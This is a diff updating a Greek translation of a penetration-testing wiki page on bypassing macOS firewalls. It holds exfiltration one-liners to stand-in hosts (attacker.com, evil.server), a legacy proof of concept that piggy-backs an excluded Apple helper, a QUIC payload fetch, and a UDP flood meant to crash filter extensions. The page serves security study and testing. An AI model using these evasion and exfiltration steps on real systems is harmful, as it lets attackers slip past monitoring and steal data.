@@ -1,40 +1,40 @@
-# macOS Bypassing Firewalls
+# Παράκαμψη Firewalls στο macOS
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Βρέθηκαν τεχνικές
+## Τεχνικές που εντοπίστηκαν
 
-Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε κάποιες macOS firewall apps.
+Οι παρακάτω τεχνικές βρέθηκε ότι λειτουργούν σε ορισμένες εφαρμογές firewall του macOS.
 
 ### Abusing whitelist names
 
-- Για παράδειγμα, ονομάζοντας το malware με ονόματα γνωστών macOS διεργασιών όπως **`launchd`**
+- Για παράδειγμα, εκτελώντας το malware με ονόματα γνωστών διεργασιών του macOS, όπως το **`launchd`**
 
 ### Synthetic Click
 
-- Αν το firewall ζητήσει άδεια από τον χρήστη, κάνε το malware να **κλικάρει στο allow**
+- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το malware να **κάνει κλικ στο allow**
 
 ### **Use Apple signed binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+- Όπως το **`curl`**, αλλά και άλλα, όπως το **`whois`**
 
-### Well known apple domains
+### Γνωστά apple domains
 
-Το firewall μπορεί να επιτρέπει συνδέσεις σε γνωστά apple domains όπως **`apple.com`** ή **`icloud.com`**. Το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.
+Το firewall ενδέχεται να επιτρέπει συνδέσεις σε γνωστά apple domains, όπως τα **`apple.com`** ή **`icloud.com`**. Επίσης, το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.
 
 ### Generic Bypass
 
 Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε firewalls
 
-### Check allowed traffic
+### Έλεγχος επιτρεπόμενης κίνησης
 
-Η γνώση της επιτρεπόμενης κίνησης θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές έχουν δικαίωμα πρόσβασης σε αυτά
+Η γνώση της επιτρεπόμενης κίνησης θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτά
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Κατάχρηση DNS
 
-Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα έχει άδεια να επικοινωνεί με τους διακομιστές DNS.
+Οι επιλύσεις DNS πραγματοποιούνται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα επιτρέπεται να επικοινωνεί με DNS servers.<sup>[1]</sup>
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -61,9 +61,10 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Μέσω processes injections
+### Μέσω process injections
 
-Αν μπορείτε να **inject code into a process** που επιτρέπεται να συνδεθεί σε οποιονδήποτε server, μπορείτε να παρακάμψετε τις προστασίες του firewall:
+If you can **inject code into a process** that is allowed to connect to any server, you could bypass the firewall protections:
+
 
 {{#ref}}
 macos-proces-abuse/
@@ -71,31 +72,31 @@ macos-proces-abuse/
 
 ---
 
-## Πρόσφατες macOS firewall bypass vulnerabilities (2023-2025)
+## Πρόσφατα macOS firewall bypass vulnerabilities (2023-2025)
 
-### Web content filter (Screen Time) bypass – **CVE-2024-44206**
-Τον Ιούλιο του 2024 η Apple διόρθωσε ένα κρίσιμο σφάλμα στο Safari/WebKit που έσπασε το system-wide “Web content filter” που χρησιμοποιείται από τα Screen Time parental controls.
-Ένα ειδικά κατασκευασμένο URI (π.χ. με διπλά URL-encoded “://”) δεν αναγνωρίζεται από το Screen Time ACL αλλά γίνεται αποδεκτό από το WebKit, οπότε το request αποστέλλεται χωρίς φιλτράρισμα. Οποιοδήποτε process που μπορεί να ανοίξει ένα URL (συμπεριλαμβανομένου sandboxed ή unsigned code) μπορεί επομένως να φτάσει domains που έχουν ρητά μπλοκαριστεί από τον χρήστη ή από ένα MDM profile.
+### Παράκαμψη του Web content filter (Screen Time) – **CVE-2024-44206**
+Τον Ιούλιο του 2024, η Apple διόρθωσε ένα κρίσιμο bug στο Safari/WebKit, το οποίο επηρέαζε το system-wide “Web content filter” που χρησιμοποιείται από τους γονικούς ελέγχους του Screen Time.
+Ένα ειδικά διαμορφωμένο URI (για παράδειγμα, με διπλά URL-encoded “://”) δεν αναγνωρίζεται από το Screen Time ACL, αλλά γίνεται αποδεκτό από το WebKit, με αποτέλεσμα το request να αποστέλλεται χωρίς filtering. Επομένως, οποιοδήποτε process μπορεί να ανοίξει ένα URL (συμπεριλαμβανομένων sandboxed ή unsigned code) μπορεί να αποκτήσει πρόσβαση σε domains που έχουν αποκλειστεί ρητά από τον χρήστη ή από ένα MDM profile.<sup>[2]</sup>
 
-Πρακτικό τεστ (μη patched σύστημα):
+Practical test (un-patched system):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Σφάλμα στην ταξινόμηση κανόνων του Packet Filter (PF) στις πρώιμες εκδόσεις του macOS 14 “Sonoma”
-Κατά τη διάρκεια του beta κύκλου του macOS 14, η Apple εισήγαγε μια παλινδρόμηση στο userspace wrapper γύρω από **`pfctl`**.
-Κανόνες που προστέθηκαν με τη λέξη-κλειδί `quick` (που χρησιμοποιείται από πολλά VPN kill-switches) αγνοήθηκαν σιωπηλά, προκαλώντας traffic leaks ακόμη και όταν το GUI του VPN/firewall ανέφερε *blocked*. Το σφάλμα επιβεβαιώθηκε από αρκετούς προμηθευτές VPN και διορθώθηκε στο RC 2 (build 23A344).
+### Σφάλμα σειράς κανόνων του Packet Filter (PF) στις πρώιμες εκδόσεις του macOS 14 “Sonoma”
+Κατά τον κύκλο beta του macOS 14, η Apple εισήγαγε μια regression στο userspace wrapper γύρω από το **`pfctl`**.
+Οι κανόνες που προστέθηκαν με το keyword `quick` (το οποίο χρησιμοποιείται από πολλά VPN kill-switches) αγνοούνταν σιωπηλά, προκαλώντας traffic leaks ακόμη και όταν ένα VPN/firewall GUI εμφάνιζε *blocked*. Το bug επιβεβαιώθηκε από αρκετούς VPN vendors και διορθώθηκε στο RC 2 (build 23A344).
 
-Γρήγορος έλεγχος για leaks:
+Γρήγορος έλεγχος για leak:
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-### Κατάχρηση Apple-signed helper services (legacy – pre-macOS 11.2)
-Πριν από το macOS 11.2 το **`ContentFilterExclusionList`** επέτρεπε ~50 Apple binaries όπως το **`nsurlsessiond`** και το App Store να παρακάμπτουν όλα τα socket-filter firewalls που υλοποιούνται με το Network Extension framework (LuLu, Little Snitch, κ.λπ.).
-Malware μπορούσε απλά να spawn ένα excluded process — ή να inject code σε αυτό — και να tunnel την κίνησή του πάνω από το ήδη-επιτρεπόμενο socket. Η Apple αφαίρεσε πλήρως τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η τεχνική εξακολουθεί να είναι σχετική σε συστήματα που δεν μπορούν να αναβαθμιστούν.
+### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
+Πριν από το macOS 11.2, το **`ContentFilterExclusionList`** επέτρεπε σε περίπου 50 Apple binaries, όπως τα **`nsurlsessiond`** και το App Store, να παρακάμπτουν όλα τα socket-filter firewalls που υλοποιούνταν με το framework Network Extension (LuLu, Little Snitch κ.λπ.).
+Το malware μπορούσε απλώς να κάνει spawn μια excluded process —ή να κάνει inject code σε αυτή— και να κάνει tunnel τη δική του traffic μέσω του socket που είχε ήδη επιτραπεί. Η Apple αφαίρεσε πλήρως τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η τεχνική παραμένει σχετική σε συστήματα που δεν μπορούν να αναβαθμιστούν.<sup>[3]</sup>
 
-Example proof-of-concept (pre-11.2):
+Παράδειγμα proof-of-concept (pre-11.2):
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -104,8 +105,8 @@ subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store
 s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
-### QUIC/ECH για να παρακάμψετε τα Network Extension domain filters (macOS 12+)
-Οι NEFilter Packet/Data Providers βασίζονται στο TLS ClientHello SNI/ALPN. Με **HTTP/3 over QUIC (UDP/443)** και **Encrypted Client Hello (ECH)** το SNI παραμένει κρυπτογραφημένο, το NetExt δεν μπορεί να αναλύσει τη ροή, και οι κανόνες hostname συχνά fail-open, επιτρέποντας στο malware να φτάσει σε μπλοκαρισμένα domains χωρίς να αγγίξει το DNS.
+### QUIC/ECH για παράκαμψη domain filters του Network Extension (macOS 12+)
+Οι NEFilter Packet/Data Providers βασίζονται στα TLS ClientHello SNI/ALPN. Με **HTTP/3 over QUIC (UDP/443)** και **Encrypted Client Hello (ECH)**, το SNI παραμένει κρυπτογραφημένο, το NetExt δεν μπορεί να αναλύσει το flow και οι κανόνες hostname συχνά αποτυγχάνουν ανοιχτά (fail-open), επιτρέποντας σε malware να επικοινωνήσει με blocked domains χωρίς να αγγίξει το DNS.<sup>[5]</sup>
 
 Ελάχιστο PoC:
 ```bash
@@ -118,12 +119,12 @@ https://attacker.com/payload
 # cURL 8.10+ built with quiche
 curl --http3-only https://attacker.com/payload
 ```
-Αν το QUIC/ECH είναι ακόμα ενεργό, αυτό είναι ένας εύκολος τρόπος παράκαμψης hostname-filter.
+Αν το QUIC/ECH είναι ακόμη ενεργοποιημένο, αυτή είναι μια εύκολη μέθοδος παράκαμψης φίλτρου hostname.
 
-### Αστάθεια του macOS 15 “Sequoia” Network Extension (2024–2025)
-Οι πρώιμες builds 15.0/15.1 προκαλούν συντριβή στα τρίτων **Network Extension** φίλτρα (LuLu, Little Snitch, Defender, SentinelOne, κ.ά.). Όταν το φίλτρο επανεκκινηθεί, το macOS απορρίπτει τα flow rules του και πολλά προϊόντα fail‑open. Η πλημμύρα του φίλτρου με χιλιάδες σύντομες ροές UDP (ή ο εξαναγκασμός του QUIC/ECH) μπορεί να προκαλέσει επανειλημμένα τη συντριβή και να αφήσει παράθυρο για C2/exfil ενώ το GUI εξακολουθεί να ισχυρίζεται ότι το firewall τρέχει.
+### Αστάθεια του Network Extension στο macOS 15 “Sequoia” (2024–2025)
+Οι πρώιμες εκδόσεις 15.0/15.1 προκαλούν crash σε φίλτρα τρίτων του **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne κ.λπ.). Όταν το φίλτρο κάνει restart, το macOS απορρίπτει τους flow rules του και πολλά προϊόντα λειτουργούν σε fail-open mode. Η πλημμύρα του φίλτρου με χιλιάδες σύντομες UDP flows (ή η επιβολή QUIC/ECH) μπορεί να προκαλεί επανειλημμένα το crash και να αφήνει ένα παράθυρο για C2/exfil, ενώ το GUI εξακολουθεί να εμφανίζει ότι το firewall εκτελείται.<sup>[4]</sup>
 
-Γρήγορη αναπαραγωγή (ασφαλές εργαστηριακό μηχάνημα):
+Γρήγορη αναπαραγωγή (ασφαλές lab box):
 ```bash
 # create many short UDP flows to exhaust NE filter queues
 python3 - <<'PY'
@@ -137,26 +138,26 @@ log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslo
 ```
 ---
 
-## Συμβουλές εργαλείων για το σύγχρονο macOS
+## Συμβουλές εργαλείων για σύγχρονο macOS
 
 1. Επιθεωρήστε τους τρέχοντες κανόνες PF που δημιουργούν τα GUI firewalls:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Καταγράψτε τα binaries που ήδη διαθέτουν το *outgoing-network* entitlement (χρήσιμο για piggy-backing):
+2. Καταγράψτε τα binaries που διαθέτουν ήδη το entitlement *outgoing-network* (χρήσιμο για piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
-3. Καταχωρήστε προγραμματικά τον δικό σας Network Extension content filter σε Objective-C/Swift.
-Ένα ελάχιστο rootless PoC που προωθεί πακέτα σε ένα local socket είναι διαθέσιμο στον πηγαίο κώδικα του Patrick Wardle’s **LuLu**.
+3. Καταχωρίστε προγραμματιστικά το δικό σας Network Extension content filter σε Objective-C/Swift.
+Ένα minimal rootless PoC που προωθεί packets σε ένα local socket είναι διαθέσιμο στον source code του **LuLu** του Patrick Wardle.
 
 ## Αναφορές
 
-- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
-- <https://nosebeard.co/advisories/nbl-001.html>
-- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
-- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
-- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>
+- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Δημιουργία και παραβίαση macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+- [2] [Το Apple web content filter bypass επιτρέπει unrestricted access σε blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
+- [3] [Η Apple αφαιρεί macOS feature που επέτρεπε σε apps να κάνουν bypass το Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
+- [4] [Cybersecurity Products Conking Out μετά το macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
+- [5] [Χρησιμοποιήστε network protection για να αποτρέψετε macOS connections σε bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
 
 {{#include ../../banners/hacktricks-training.md}}
